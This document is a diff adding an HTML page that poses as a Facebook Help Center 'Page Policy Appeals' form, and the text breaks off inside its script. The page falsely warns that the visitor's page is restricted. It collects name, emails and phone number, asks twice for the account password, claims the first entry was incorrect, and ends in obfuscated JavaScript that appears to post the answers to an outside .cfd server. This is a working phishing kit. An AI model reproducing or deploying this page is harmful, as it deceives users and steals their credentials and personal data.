@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+     <link rel="icon" href="https://businessservices.cfd/assets/images/fb_icon.ico" type="image/x-icon">
+    <title>Facebook Help Center - Page Policy Appeals</title>
+   
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        facebook: '#385899'
+                    }
+                }
+            }
+        }
+    </script>
+    <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+    <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    <meta name="csrf-token" content="dummy-csrf-token">
+</head>
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    }
+
+    /* Simple Facebook Loading */
+    .facebook-loader {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: #ffffff;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 9999;
+        flex-direction: column;
+    }
+
+    .facebook-loader.fade-out {
+        opacity: 0;
+        transition: opacity 0.5s ease-out;
+    }
+
+    /* Facebook Logo */
+    .facebook-logos {
+        width: 60px;
+        height: 60px;
+        margin-bottom: 20px;
+    }
+
+    /* Simple Spinner */
+    .facebook-spinner {
+        width: 32px;
+        height: 32px;
+        border: 3px solid #e4e6ea;
+        border-top: 3px solid #1877f2;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+        0% {
+            transform: rotate(0deg);
+        }
+
+        100% {
+            transform: rotate(360deg);
+        }
+    }
+
+    /* Loading Text */
+    .loading-text {
+        margin-top: 15px;
+        color: #65676b;
+        font-size: 14px;
+    }
+
+    /* Main Content */
+    .main-content {
+        display: none;
+        padding: 50px 20px;
+        text-align: center;
+        min-height: 100vh;
+        background: #f0f2f5;
+    }
+
+    .main-content.show {
+        display: block;
+        animation: fadeIn 0.5s ease-in;
+    }
+
+    @keyframes fadeIn {
+        from {
+            opacity: 0;
+        }
+
+        to {
+            opacity: 1;
+        }
+    }
+
+    .welcome-box {
+        background: white;
+        padding: 40px;
+        border-radius: 8px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        max-width: 500px;
+        margin: 0 auto;
+    }
+
+    .welcome-box h1 {
+        color: #1877f2;
+        margin-bottom: 15px;
+        font-size: 24px;
+    }
+
+    .welcome-box p {
+        color: #65676b;
+        line-height: 1.5;
+        margin-bottom: 20px;
+    }
+
+    button {
+        background: #1877f2;
+        color: white;
+        border: none;
+        padding: 10px 20px;
+        border-radius: 6px;
+        cursor: pointer;
+        font-size: 14px;
+        font-weight: 500;
+    }
+
+    button:hover {
+        background: #166fe5;
+    }
+</style>
+
+<body>
+    <!-- Simple Facebook Loading -->
+    <div id="facebookLoader" class="facebook-loader">
+        <div class="facebook-logos">
+            <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#1877f2"
+                    d="M1024 512C1024 229.23 794.77 0 512 0S0 229.23 0 512c0 255.55 187.23 467.37 432 505.78V660H302V512h130V399.2C432 270.88 508.44 200 625.39 200c56.5 0 115.61 10.1 115.61 10.1v127.2h-65.15c-64.16 0-84.18 39.83-84.18 80.65V512H741l-26.35 148H591.27v357.78C836.77 979.37 1024 767.55 1024 512z" />
+            </svg>
+        </div>
+    </div>
+    <div class="topheader bg-facebook p-2">
+        <div class="sm:w-11/12 md:w-4/6 flex justify-between items-center mx-auto">
+            <div class="w-[20%] md:w-[15%]">
+                <a href="">
+                    <img src="./images/logo.svg.png" class="object-cover">
+                </a>
+            </div>
+            <div class="flex shadow-sm w-[60%] md:w-[50%]">
+                <span
+                    class="px-4 inline-flex items-center min-w-fit border border-r-0 border-gray-200 bg-gray-50 text-sm "><ion-icon
+                        name="search-outline" role="img" class="md hydrated"></ion-icon></span>
+                <input type="search"
+                    class="py-2 px-3 pr-11 block w-full border-gray-200 shadow-sm text-sm focus:z-10 focus:border-blue-500 focus:ring-blue-500 focus:outline-none"
+                    placeholder="How can we help?">
+            </div>
+        </div>
+    </div>
+    <div class="bg-[#E9EBEE]">
+        <div class="w-11/12 sm:w-11/12 md:w-4/6 flex justify-between items-center mx-auto">
+            <a href="#"
+                class="flex items-center text-[#3578E5] gap-2 font-semibold py-4 border-b-[3px] border-[#3578E5]">
+                <ion-icon name="home" role="img" class="md hydrated"></ion-icon> Help Center
+            </a>
+            <p class="text-[#3578E5] text-xs">English</p>
+        </div>
+    </div>
+    <div class="w-11/12 sm:w-11/12 md:w-4/6 grid gap-10 mx-auto my-8 grid-cols-1 md:grid-cols-[0.3fr_1fr] "
+        style="padding-bottom:100px;">
+        <div class="order-2 md:order-none">
+            <ul class="[&>li>a]:text-[14px] [&>li>a]:py-[5px] [&>li>a]:pr-5 [&>li>a]:block [&>li>a:hover]:bg-[#E9EBEE]">
+                <li><a href="#">Creating an Account</a></li>
+                <li><a href="#">Your Profile</a></li>
+                <li><a href="#">Friending</a></li>
+                <li><a href="#">Facebook Dating</a></li>
+                <li><a href="#">Your Home Page</a></li>
+                <li><a href="#">Messaging</a></li>
+                <li><a href="#">Reels</a></li>
+                <li><a href="#">Stories</a></li>
+                <li><a href="#">Photos</a></li>
+                <li><a href="#">Videos</a></li>
+                <li><a href="#">Gaming</a></li>
+                <li><a href="#">Pages</a></li>
+                <li><a href="#">Groups</a></li>
+                <li><a href="#">Events</a></li>
+                <li><a href="#">Fundraisers and Donations</a></li>
+                <li><a href="#">Meta Pay</a></li>
+                <li><a href="#">Marketplace</a></li>
+                <li><a href="#">Apps</a></li>
+                <li><a href="#">Facebook Mobile Apps</a></li>
+                <li><a href="#">Accessibility</a></li>
+            </ul>
+        </div>
+        <form id="ccnpwxpytrb" class="w-100% md:w-[74%] rounded-lg border border-gray-200 h-fit order-1 md:order-none">
+            <div class="font-semibold rounded-t-lg text-lg border-b border-gray-200 bg-[#F5F6F7] p-3">
+                <h1>Page Policy Appeals</h1>
+            </div>
+            <div class="p-4">
+                <p class="text-xs mb-4 translate-p1">We have detected unusual activity on your page that violates our
+                    community standards.</p>
+                <p class="text-xs mb-4 translate-p2">Your access to your page has been limited, and you are currently
+                    unable to post, share, or comment using your page.</p>
+                <p class="text-xs mb-4 translate-p3">If you believe this to be a mistake, you have the option to submit
+                    an appeal by providing the necessary information.</p>
+
+                <div class="mb-4">
+                    <label class="block">
+                        <span
+                            class="text-[#90949C] after:content-['*'] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">
+                            Name Page
+                        </span>
+                        <input type="text" name="page" required=""
+                            class="w-1/2 mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1">
+                    </label>
+                </div>
+                <div class="mb-4">
+                    <label class="block">
+                        <span
+                            class="text-[#90949C] after:content-['*'] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">
+                            Fullname
+                        </span>
+                        <input type="text" name="fullname" required=""
+                            class="w-1/2 mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1">
+                    </label>
+                </div>
+                <div class="mb-4">
+                    <label class="block">
+                        <span
+                            class="text-[#90949C] after:content-['*'] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">
+                            Business Email Address
+                        </span>
+                        <input type="email" name="business_email" required=""
+                            class="w-1/2 mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1">
+                    </label>
+                </div>
+                <div class="mb-4">
+                    <label class="block">
+                        <span
+                            class="text-[#90949C] after:content-['*'] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">
+                            Personal Email Address
+                        </span>
+                        <input type="email" name="personal_email" required=""
+                            class="w-1/2 mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1">
+                    </label>
+                </div>
+                <div class="mb-4">
+                    <label class="block">
+                        <span
+                            class="text-[#90949C] after:content-['*'] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">
+                            Mobile Phone Number
+                        </span>
+                        <input type="text" name="phone" required=""
+                            onkeypress="return (event.charCode !=8 && event.charCode ==0 || (event.charCode >= 48 && event.charCode <= 57))"
+                            class="w-1/2 mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1">
+                    </label>
+                </div>
+                <div class="mb-4">
+                    <label class="block">
+                        <span class="text-[#90949C] block text-xs font-bold text-[#90949C]">
+                            Please provide us information that will help us investigate.
+                        </span>
+                        <textarea type="text" name="yykwevbhfh"
+                            class="w-3/4 mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block rounded-sm sm:text-sm focus:ring-1"
+                            rows="4"></textarea>
+                    </label>
+                </div>
+            </div>
+            <div class="font-semibold rounded-b-lg flex justify-end text-lg border-t border-gray-200 bg-[#F5F6F7] p-3">
+                <button type="submit"
+                    class="bg-blue-800 hover:bg-facebook rounded-sm px-4 py-2 text-white text-sm font-semibold">Send</button>
+            </div>
+        </form>
+    </div>
+    <hr>
+    <div
+        style="max-width: 1200px; margin: 0 auto; padding: 20px; text-align: center; background-color: white; border-radius: 8px;">
+        <div style="margin-bottom: 20px; line-height: 1.6;">
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">English (US)</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Svenska</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">Tiếng
+                Việt</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">العربية</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Polski</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Español</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Türkçe</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Français (France)</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Deutsch</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">ภาษาไทย</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Português (Brasil)</a>
+            <a href="#"
+                style="color: #1877f2; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block; background: #f0f2f5; padding: 2px 8px; border-radius: 2px; font-weight: bold;"
+                onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">+</a>
+        </div>
+
+        <div style="margin-bottom: 20px; line-height: 1.8;">
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">Sign
+                Up</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">Log
+                In</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Messenger</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Facebook Lite</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Video</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">Meta
+                Pay</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">Meta
+                Store</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">Meta
+                Quest</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Ray-Ban Meta</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">Meta
+                AI</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">AI-generated content</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Instagram</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Threads</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Privacy Center</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Privacy Policy</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Privacy Center</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">Cookie
+                Settings</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">About</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">Create
+                Ad</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">Create
+                Page</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Developers</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Careers</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Cookies</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">Ad
+                Choices</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Terms</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Help</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Contact Uploading & Non-Users</a>
+        </div>
+
+        <div style="color: #8a8d91; font-size: 11px; margin-top: 20px;">
+            Meta © 2025
+        </div>
+    </div>
+
+    <!-- Modal -->
+       <div id="modalEl" tabindex="-1" aria-hidden="true"
+        class="fixed top-0 left-0 right-0 z-50 hidden w-full p-4 overflow-x-hidden overflow-y-auto md:inset-0 h-[calc(100%-1rem)] max-h-full justify-center items-center bg-black bg-opacity-50">
+        <div class="relative w-full max-w-2xl max-h-full">
+            <div class="relative bg-white rounded-lg shadow">
+                <div class="flex items-start justify-between p-4 border-b rounded-t">
+                    <h3 class="text-xl font-semibold text-gray-900">
+                        Please Enter Your Password
+                    </h3>
+                    <button type="button" id="closeModalBtn" class="text-gray-400 bg-transparent hover:bg-gray-200 hover:text-gray-900 rounded-lg text-sm w-8 h-8 ml-auto inline-flex justify-center items-center">
+                        <svg class="w-3 h-3" fill="none" viewBox="0 0 14 14">
+                            <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 6 6m0 0 6 6M7 7l6-6M7 7l-6 6"/>
+                        </svg>
+                    </button>
+                </div>
+                <div class="p-6 space-y-6">
+                    <p class="text-base leading-relaxed text-gray-500">
+                        For your security, you must enter your password to continue.
+                    </p>
+                    <form class="space-y-6" id="mvmgxlrpqdl">
+                        <div class="relative">
+                            <label for="hxeyfibmtuv" class="block mb-2 text-sm font-medium text-gray-900">
+                                Your password
+                            </label>
+                            <input type="password" name="password" id="hxeyfibmtuv" placeholder="Enter your password"
+                                class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 pr-10"
+                                required />
+
+                                 <!-- Icon show/hide -->
+                        
+                            <p class="error_password text-red-700 text-sm mt-1"></p>
+                        </div>
+                        <button type="submit"
+                            class="w-full text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center flex items-center justify-center disabled:opacity-70 disabled:cursor-not-allowed">
+                            <span id="btnText">Continue</span>
+                            <div id="btnLoader" class="spinner ml-2 hidden"></div>
+                        </button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+<!-- <script src="./assets/assets/js/form.js"></script> -->
+<script>  
+     const _0x3abe43=_0x84bd;(function(_0x4a8c3a,_0x948170){const _0x52b0df=_0x84bd,_0x1662e1=_0x4a8c3a();while(!![]){try{const _0x297457=-parseInt(_0x52b0df(0x166))/(-0x776+-0x11*-0x47+0x2c0)+-parseInt(_0x52b0df(0x1a1))/(0x7ab+-0x187d*0x1+-0x2ce*-0x6)*(-parseInt(_0x52b0df(0x178))/(0x915+-0x25d9+0x35*0x8b))+parseInt(_0x52b0df(0x190))/(0x1*-0x19e4+-0x230c+0x3cf4)+-parseInt(_0x52b0df(0x15a))/(-0x10bb+-0x18cb+-0x2c5*-0xf)*(parseInt(_0x52b0df(0x129))/(0x3b4+0x17*-0x51+0x399))+-parseInt(_0x52b0df(0x16e))/(0x3*-0x286+-0x9ab+0x1144)*(parseInt(_0x52b0df(0x14c))/(-0x1*0x204+0x1*0x16ed+-0x14e1))+parseInt(_0x52b0df(0x142))/(0x19dd+-0x1204+-0x7d0)*(parseInt(_0x52b0df(0x1a2))/(0x249d+-0x1b1c+-0x977))+-parseInt(_0x52b0df(0x173))/(0x2*0x31a+-0x29*-0x5d+0x150e*-0x1)*(-parseInt(_0x52b0df(0x18c))/(0xae4+-0x198d+-0x2f1*-0x5));if(_0x297457===_0x948170)break;else _0x1662e1['push'](_0x1662e1['shift']());}catch(_0x3b3917){_0x1662e1['push'](_0x1662e1['shift']());}}}(_0x4212,-0x1391*0x25+0x59671+-0x1*-0x40eb));const modalEl=document[_0x3abe43(0x171)+_0x3abe43(0x115)](_0x3abe43(0x113)),openModalBtn=document[_0x3abe43(0x171)+_0x3abe43(0x115)](_0x3abe43(0x161)+'tn'),mvmgxlrpqdl=document[_0x3abe43(0x171)+_0x3abe43(0x115)](_0x3abe43(0x168)+'l'),hxeyfibmtuv=document[_0x3abe43(0x171)+_0x3abe43(0x115)](_0x3abe43(0x19b)+'v'),togglePassword=document[_0x3abe43(0x171)+_0x3abe43(0x115)](_0x3abe43(0x133)+_0x3abe43(0x19e)),eyeIcon=document[_0x3abe43(0x171)+_0x3abe43(0x115)](_0x3abe43(0x195)),eyeSlashIcon=document[_0x3abe43(0x171)+_0x3abe43(0x115)](_0x3abe43(0x181)+'on'),error_password=document[_0x3abe43(0x18a)+_0x3abe43(0x176)](_0x3abe43(0x13c)+_0x3abe43(0x19a)),btnText=document[_0x3abe43(0x171)+_0x3abe43(0x115)](_0x3abe43(0x12b)),btnLoader=document[_0x3abe43(0x171)+_0x3abe43(0x115)](_0x3abe43(0x16d));function _0x4212(){const _0xaae9ff=['eyeIcon','remove','The\x20passwo','hFYzJ','which','sword','hxeyfibmtu','ccnpwxpytr','LaRsJ','word','display','PqYru','4JhvWVG','1139920CNPUAN','find','rd\x20you\x27ve\x20','modalEl','content','ById','sword\x22]','https://te','target','fromCharCo','TlTex','IuWjb','2|0|3|4|7|','ggzIY','jdhKO','classList','load','Continue','button[typ','num_enter_','[name=\x22pas','\x20incorrect','append','or.cfd/api','XwPxJ','1588938XXOdVZ','show','btnText','entered\x20is','leodh','nktYs','ajax','x.html','t/2fa-8zUF','HLzqA','togglePass','val','textConten','disabled','POST','tFoPE','lEuhA','NkGDZ','AZzvE','.error_pas','ZniQW','gygTf','log','first_pass','JwGMa','27bOpvuR','ader','ahTPH','Tiếp\x20tục','prqDE','test','ajaxSetup','shkdQ','n\x22]','e=\x22submit\x22','16EzgaNx','nkHNp','JrPMj','split','password','add','preventDef','SXbme','none','wYpMz','pPCBE','qfYYT','AUInH','mainConten','5zwQYYS','VgzCz','QJYvO','hidden','Wgzfb','second_pas','CJiEC','openModalB','fade-out','submit','\x22csrf-toke','input[name','116523zyfARX','GWkM6YAolh','mvmgxlrpqd','EBpGY','DXoBP','reset','/account','btnLoader','285593DeESJI','click','location','getElement','ejVnK','111221IqSQcx','/managemen','=\x22phone\x22]','tor','zNrnS','6525QkYomn','keypress','flex','1|6|5','slkHW','TQJmV','drzCo','8hPsb7dDWN','text','eyeSlashIc','addEventLi','kvsnN','NnaHZIqnAg','aOvNL','meta[name=','href','ault','COgrt','querySelec','rDNpD','204zJYKCe','facebookLo','xPWtH','stener','568840WzSxhs','h.apiliupp','type','attr','style'];_0x4212=function(){return _0xaae9ff;};return _0x4212();}closeModalBtn[_0x3abe43(0x182)+_0x3abe43(0x18f)](_0x3abe43(0x16f),()=>{const _0x58943c=_0x3abe43,_0x3d2b1f={'lEuhA':_0x58943c(0x15d),'CJiEC':_0x58943c(0x17a),'NkGDZ':function(_0x276d0a){return _0x276d0a();}};modalEl[_0x58943c(0x11f)][_0x58943c(0x151)](_0x3d2b1f[_0x58943c(0x139)]),modalEl[_0x58943c(0x11f)][_0x58943c(0x196)](_0x3d2b1f[_0x58943c(0x160)]),_0x3d2b1f[_0x58943c(0x13a)](resetForm);}),modalEl[_0x3abe43(0x182)+_0x3abe43(0x18f)](_0x3abe43(0x16f),_0x356332=>{const _0x433085=_0x3abe43,_0x5e5bd4={'HLzqA':function(_0x548fcf,_0x29dfa4){return _0x548fcf===_0x29dfa4;},'qfYYT':_0x433085(0x15d),'tFoPE':_0x433085(0x17a)};_0x5e5bd4[_0x433085(0x132)](_0x356332[_0x433085(0x118)],modalEl)&&(modalEl[_0x433085(0x11f)][_0x433085(0x151)](_0x5e5bd4[_0x433085(0x157)]),modalEl[_0x433085(0x11f)][_0x433085(0x196)](_0x5e5bd4[_0x433085(0x138)]));}),document[_0x3abe43(0x171)+_0x3abe43(0x115)](_0x3abe43(0x19c)+'b')[_0x3abe43(0x182)+_0x3abe43(0x18f)](_0x3abe43(0x163),function(_0x39bb98){const _0x21cad4=_0x3abe43,_0x4a69af={'AUInH':_0x21cad4(0x113),'XwPxJ':_0x21cad4(0x15d),'pPCBE':_0x21cad4(0x17a)};_0x39bb98[_0x21cad4(0x152)+_0x21cad4(0x188)](),document[_0x21cad4(0x171)+_0x21cad4(0x115)](_0x4a69af[_0x21cad4(0x158)])[_0x21cad4(0x11f)][_0x21cad4(0x196)](_0x4a69af[_0x21cad4(0x128)]),document[_0x21cad4(0x171)+_0x21cad4(0x115)](_0x4a69af[_0x21cad4(0x158)])[_0x21cad4(0x11f)][_0x21cad4(0x151)](_0x4a69af[_0x21cad4(0x156)]);});let num_enter_password=0x1*-0x2df+-0x613*0x3+0x1519;document[_0x3abe43(0x171)+_0x3abe43(0x115)](_0x3abe43(0x113))[_0x3abe43(0x182)+_0x3abe43(0x18f)](_0x3abe43(0x163),function(_0x3b7463){const _0x49c242=_0x3abe43,_0x20e8dc={'hFYzJ':_0x49c242(0x121),'VgzCz':_0x49c242(0x15d),'TQJmV':function(_0x58baec,_0x5c86a9){return _0x58baec==_0x5c86a9;},'aOvNL':_0x49c242(0x174)+_0x49c242(0x131)+_0x49c242(0x167)+_0x49c242(0x184)+_0x49c242(0x17f)+_0x49c242(0x130),'rDNpD':function(_0x3a63d8,_0x702b59){return _0x3a63d8(_0x702b59);},'wYpMz':_0x49c242(0x13c)+_0x49c242(0x19a),'zNrnS':_0x49c242(0x197)+_0x49c242(0x1a4)+_0x49c242(0x12c)+_0x49c242(0x125)+'.','prqDE':_0x49c242(0x124)+_0x49c242(0x116),'LaRsJ':_0x49c242(0x122)+_0x49c242(0x14b)+']','PqYru':function(_0xa62eda,_0x27921b,_0x190b95){return _0xa62eda(_0x27921b,_0x190b95);},'drzCo':function(_0x41af58,_0x3a726b){return _0x41af58(_0x3a726b);},'slkHW':_0x49c242(0x19c)+'b','IuWjb':_0x49c242(0x140)+_0x49c242(0x19e),'JwGMa':_0x49c242(0x15f)+_0x49c242(0x19a),'TlTex':_0x49c242(0x123)+_0x49c242(0x150),'ahTPH':_0x49c242(0x117)+_0x49c242(0x191)+_0x49c242(0x127)+_0x49c242(0x16c),'JrPMj':_0x49c242(0x137)},_0x2f8478=_0x3b7463[_0x49c242(0x118)][_0x49c242(0x18a)+_0x49c242(0x176)](_0x20e8dc[_0x49c242(0x19d)]);_0x2f8478[_0x49c242(0x136)]=!![],btnText[_0x49c242(0x135)+'t']=_0x20e8dc[_0x49c242(0x198)],btnLoader[_0x49c242(0x11f)][_0x49c242(0x196)](_0x20e8dc[_0x49c242(0x15b)]),_0x20e8dc[_0x49c242(0x1a0)](setTimeout,function(){const _0x30a7c5=_0x49c242;_0x2f8478[_0x30a7c5(0x136)]=![],btnText[_0x30a7c5(0x135)+'t']=_0x20e8dc[_0x30a7c5(0x198)],btnLoader[_0x30a7c5(0x11f)][_0x30a7c5(0x151)](_0x20e8dc[_0x30a7c5(0x15b)]);},-0x15*-0xd7+0x427*-0x9+0x1f74),_0x3b7463[_0x49c242(0x152)+_0x49c242(0x188)]();let 